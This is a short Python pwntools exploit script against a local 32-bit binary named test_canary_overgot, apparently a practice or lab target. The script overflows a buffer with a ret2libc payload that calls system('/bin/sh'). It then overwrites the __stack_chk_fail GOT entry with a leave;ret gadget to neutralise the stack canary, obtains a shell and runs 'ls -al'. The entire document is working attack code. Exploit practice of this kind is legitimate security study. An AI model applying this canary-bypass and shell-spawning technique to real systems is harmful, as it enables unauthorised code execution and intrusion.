from pwn import *

context(arch = 'i386', os = 'linux', log_level='debug')

p = process("./test_canary_overgot")
elf = p.elf
libc = ELF("/lib/libc.so.6")
main = elf.symbols["main"]
__stack_chk_fail_got = elf.got["__stack_chk_fail"]
lev_ret_rop = 0x080483ce # leave ; ret

print "lev_ret_rop : %x, main %x, __stack_chk_fail %x" \
	%(lev_ret_rop,  main, __stack_chk_fail_got)

system_addr = libc.symbols["system"]
binsh_addr = libc.search("/bin/sh").next()
print "off system %s, off /bin/sh %s" %( hex(system_addr), hex(binsh_addr))

payload = "A" * 32 + p32(system_addr) + p32(main) + p32(binsh_addr)
p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
p.sendline(hex(__stack_chk_fail_got))
p.recvline()
p.sendline(hex(lev_ret_rop))
p.recvline()
p.recvline()
p.sendline("ls -al")
p.recvline()
p.close()


